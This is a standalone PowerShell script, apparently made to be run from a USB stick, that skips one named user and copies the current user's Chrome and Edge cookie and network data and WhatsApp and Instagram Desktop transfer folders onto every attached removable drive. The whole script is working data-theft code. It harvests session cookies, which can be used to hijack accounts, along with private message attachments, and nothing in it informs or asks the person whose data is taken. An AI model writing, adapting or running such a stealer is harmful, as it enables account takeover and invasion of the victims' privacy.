# Block specific user (if user is "amit")
if ($env:USERPROFILE -eq "C:\Users\amit") {
    Write-Host "daddy ka laptop hai mai kuch nhi kar sakta"
    Read-Host -Prompt "Press Enter to exit"
    exit
}

# Get all removable drives
$drives = Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object -ExpandProperty DeviceID

foreach ($drive in $drives) {
    # Copy Chrome network data
    $sourceNet = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Network"
    $targetNet = "$drive\$env:USERNAME`_data\cookie_data"
    if (Test-Path $sourceNet) {
        if (-not (Test-Path $targetNet)) {
            New-Item -Path $targetNet -ItemType Directory
        }
        Copy-Item -Path "$sourceNet\*" -Destination $targetNet -Recurse -Force
    }

    # Copy Edge network data
    $sourceEdgeNet = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Network"
    $targetEdgeNet = "$drive\$env:USERNAME`_data\edge_cookie_data"
    if (Test-Path $sourceEdgeNet) {
        if (-not (Test-Path $targetEdgeNet)) {
            New-Item -Path $targetEdgeNet -ItemType Directory
        }
        Copy-Item -Path "$sourceEdgeNet\*" -Destination $targetEdgeNet -Recurse -Force
    }

    # Copy full WhatsApp Desktop profile data
    $sourceWA = "$env:USERPROFILE\AppData\Local\Packages\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\LocalState\shared\transfers"
    $targetWA = "$drive\$env:USERNAME`_data\WAData"
    if (Test-Path $sourceWA) {
        if (-not (Test-Path $targetWA)) {
            New-Item -Path $targetWA -ItemType Directory
        }
        Copy-Item -Path "$sourceWA\*" -Destination $targetWA -Recurse -Force
    }

    # Copy full Instagram Desktop profile data
    $sourceInstagram = "$env:USERPROFILE\AppData\Local\Packages\InstagramInDesktop_8wekyb3d8bbwe\LocalState\shared\transfers"
    $targetInstagram = "$drive\$env:USERNAME`_data\InstagramData"

    if (Test-Path $sourceInstagram) {
        if (-not (Test-Path $targetInstagram)) {
            New-Item -Path $targetInstagram -ItemType Directory
        }
        Copy-Item -Path "$sourceInstagram\*" -Destination $targetInstagram -Recurse -Force
    }

}

Write-Host "Copy completed successfully!"
